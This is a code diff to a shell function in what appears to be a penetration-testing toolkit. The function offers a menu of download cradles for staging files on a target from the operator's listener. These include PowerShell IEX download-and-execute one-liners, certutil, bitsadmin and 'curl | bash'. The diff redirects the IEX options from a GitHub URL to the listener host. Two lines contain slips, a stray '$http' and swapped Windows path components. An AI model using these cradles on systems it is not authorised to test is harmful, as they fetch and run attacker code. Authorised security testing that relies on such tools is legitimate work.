@@ -87,31 +87,25 @@ nb-srv-file-download() {
 
     __ask "Choose a command to copy:"
     echo "1.  Invoke-WebRequest http://${__LHOST}:${__LPORT}/$filename -OutFile $filename"
-    echo "2.  iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)"
+    echo "2.  powershell -c IEX(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)"
     echo "3.  certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename"
     echo "4.  wget http://${__LHOST}:${__LPORT}/$filename --output-file $filename"
     echo "5.  curl $http://${__LHOST}:${__LPORT}/$filename | bash"
     echo "6.  bitsadmin /transfer n http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename"
-    echo "7.  IEX(New-Object Net.WebClient).DownloadString('$ghrawurl')"
+    echo "7.  powershell -c IEX(New-Object Net.WebClient).DownloadString('http://${__LHOST}:${__LPORT}/$filename')"
     echo "8.  Previous menu"
     echo
     echo -n "Choice: "
     read choice
 
-    # if choice == 7 - ask for ghrawurl variable
-    if [ "$choice" -eq 7 ]; then
-        echo -n "Enter the github RAW URL for the script to execute: "
-        read ghrawurl
-    fi
-
     case $choice in
         1) __COMMAND="Invoke-WebRequest http://${__LHOST}:${__LPORT}/$filename -OutFile $filename";;
-        2) __COMMAND="iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)";;
+        2) __COMMAND="powershell -c IEX(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)";;
         3) __COMMAND="certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename";;
         4) __COMMAND="wget http://${__LHOST}:${__LPORT}/$filename --output-file $filename";;
         5) __COMMAND="curl http://${__LHOST}:${__LPORT}/$filename | bash";;
         6) __COMMAND="bitsadmin /transfer n http://${__LHOST}:${__LPORT}/$filename C:\\Temp\\Windows\\$filename";;
-        7) __COMMAND="IEX(New-Object Net.WebClient).DownloadString('$ghrawurl')";;
+        7) __COMMAND="powershell -c IEX(New-Object Net.WebClient).DownloadString('http://${__LHOST}:${__LPORT}/$filename')";;
         8) exit;;
         *) echo "Invalid option";;
     esac
